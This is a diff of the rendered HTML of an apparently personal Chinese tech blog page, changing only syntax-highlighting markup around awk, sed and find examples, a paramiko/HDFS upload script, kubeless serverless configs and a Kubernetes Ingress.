 &lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//十六进制数
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;下面来试试这些个格式：
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;97 | awk &lt;span class=&quot;s1&quot;&gt;'{printf(&quot;%c\n&quot;, $0)}'&lt;/span&gt;
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;97 | awk &lt;span class=&quot;s1&quot;&gt;'{printf(&quot;%c\n&quot;, $0)}'&lt;/span&gt;
 A
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;类似&lt;code class=&quot;highlighter-rouge&quot;&gt;C语言&lt;/code&gt;的格式化输出：
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;awk &lt;span class=&quot;s1&quot;&gt;'BEGIN{FS=&quot;:&quot;}{printf(&quot;%-15s%s\n&quot;, $1, $3)}'&lt;/span&gt; group_file2
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;awk &lt;span class=&quot;s1&quot;&gt;'BEGIN{FS=&quot;:&quot;}{printf(&quot;%-15s%s\n&quot;, $1, $3)}'&lt;/span&gt; group_file2
 wireshark    987
 usbmon       986
 jackuser     985
 vboxusers    984
 aln         1001
-&lt;/code&gt;&lt;/pre&gt;
-    &lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;()函数返回根据&lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt;格式说明指定的格式化的字符串，它格式化数据但不输出数据。所以需要将&lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;返回的数据保存在变量里面再输出&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;awk &lt;span class=&quot;s1&quot;&gt;'BEGIN{FS=&quot;:&quot;;ORS=&quot;&quot;}{var=sprintf(&quot;%s\n&quot;, $1);print var}'&lt;/span&gt; group_file2
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;awk &lt;span class=&quot;s1&quot;&gt;'BEGIN{FS=&quot;:&quot;;ORS=&quot;&quot;}{var=sprintf(&quot;%s\n&quot;, $1);print var}'&lt;/span&gt; group_file2
 wireshark
 usbmon
 jackuser
 vboxusers
 aln
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;清除 Javascript 脚本里面的所有console(包含即删除整行)&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sed -i &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; app.txt &lt;span class=&quot;c&quot;&gt;# Mac （Mac默认会要求你操作源文件的时候备份）&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; sed &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; app.txt &lt;span class=&quot;c&quot;&gt;# Mac （Mac默认会要求你操作源文件的时候备份）&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;# 可以配合 find 使用&lt;/span&gt;
- find . -name &lt;span class=&quot;s2&quot;&gt;&quot;*.js&quot;&lt;/span&gt;
- sed -i &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; app.txt &lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
+ find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.js&quot;&lt;/span&gt;
+ sed &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; app.txt &lt;span class=&quot;c&quot;&gt;# Linux&lt;/span&gt;
 
 &lt;span class=&quot;c&quot;&gt;#Mac &lt;/span&gt;
 
-find . -name &lt;span class=&quot;s2&quot;&gt;&quot;*.js&quot;&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{print$1}'&lt;/span&gt; | xargs -L1  -I NAME sed -i &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; NAME
+find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;*.js&quot;&lt;/span&gt; | awk &lt;span class=&quot;s1&quot;&gt;'{print$1}'&lt;/span&gt; | xargs &lt;span class=&quot;nt&quot;&gt;-L1&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; NAME sed &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;/console/d&quot;&lt;/span&gt; NAME
 
 &lt;span class=&quot;c&quot;&gt;# 如果失败或者遇到问题&lt;/span&gt;
-git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clean -xdf
+git checkout &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; git clean &lt;span class=&quot;nt&quot;&gt;-xdf&lt;/span&gt;
 
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;一个Linux 大佬 https://blog.csdn.net/imxiangzi/article/details/50387073&lt;/p&gt;
 
@@ -295,7 +282,7 @@ git checkout . &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; g
   &lt;li&gt;serverless Python 操作hdfs&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/bin/env python&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /usr/bin/env python&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# coding=utf-8&lt;/span&gt;
 
 import paramiko
@@ -336,17 +323,16 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
         &lt;span class=&quot;c&quot;&gt;# ssh root@agent-2.agent-svc.cloudera.svc.cluster.local&lt;/span&gt;
         print&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;--------------save Task To&quot;&lt;/span&gt; + path&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
         with client.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;path, &lt;span class=&quot;nv&quot;&gt;overwrite&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as writer:
-            writer.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+            writer.write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 
     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ok'&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;serverless.yml&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# For full config options, check the kubeless plugin docs:&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#    https://github.com/serverless/serverless-kubeless&lt;/span&gt;
@@ -355,7 +341,7 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
 &lt;span class=&quot;c1&quot;&gt;#    http://kubeless.io&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Update the service name below with your own service name&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;put-taskjar&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;put-taskjar&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Please ensure the serverless-kubeless provider plugin is installed globally.&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# $ npm install -g serverless-kubeless&lt;/span&gt;
@@ -363,20 +349,19 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
 &lt;span class=&quot;c1&quot;&gt;# ...before installing project dependencies to register this provider.&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# $ npm install&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;serverless-kubeless&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;task.upload&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;task.upload&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;具体信息看第一条关于 serverless 的文章。&lt;/li&gt;
@@ -390,7 +375,7 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
   &lt;li&gt;Python&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hdfs&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hdfs&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bottle&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPResponse&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://hdfs-web-svc.cloudera:50070&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
@@ -404,14 +389,13 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
         &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'ignore'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'gbk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HTTPResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;serverless.yml&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Welcome to Serverless!&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# For full config options, check the kubeless plugin docs:&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;#    https://github.com/serverless/serverless-kubeless&lt;/span&gt;
@@ -420,7 +404,7 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
 &lt;span class=&quot;c1&quot;&gt;#    http://kubeless.io&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Update the service name below with your own service name&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;
 
 &lt;span class=&quot;c1&quot;&gt;# Please ensure the serverless-kubeless provider plugin is installed globally.&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# $ npm install -g serverless-kubeless&lt;/span&gt;
@@ -428,20 +412,19 @@ def doupload&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;:
 &lt;span class=&quot;c1&quot;&gt;# ...before installing project dependencies to register this provider.&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# $ npm install&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;kubeless&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;${env:K8S_NAMESPACE, 'cloudera'}&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;runtime&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;python2.7&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;plugins&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;serverless-kubeless&lt;/span&gt;
 
-&lt;span class=&quot;s&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;handler.getfile&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;getfile&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;handler.getfile&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;ul&gt;
   &lt;li&gt;requirements.txt&lt;/li&gt;
@@ -455,21 +438,20 @@ hdfs==2.1.0
   &lt;li&gt;kubernetes Ingress&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;extensions/v1beta1&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Ingress&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile-ing&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
-&lt;span class=&quot;s&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile.kube.ibm-testing.com&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;paths&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;backend&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-          &lt;span class=&quot;s&quot;&gt;serviceName&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile&lt;/span&gt;
-          &lt;span class=&quot;s&quot;&gt;servicePort&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;8080&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;extensions/v1beta1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Ingress&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile-ing&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;namespace&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;cloudera&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;getfile.kube.ibm-testing.com&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;paths&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;backend&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
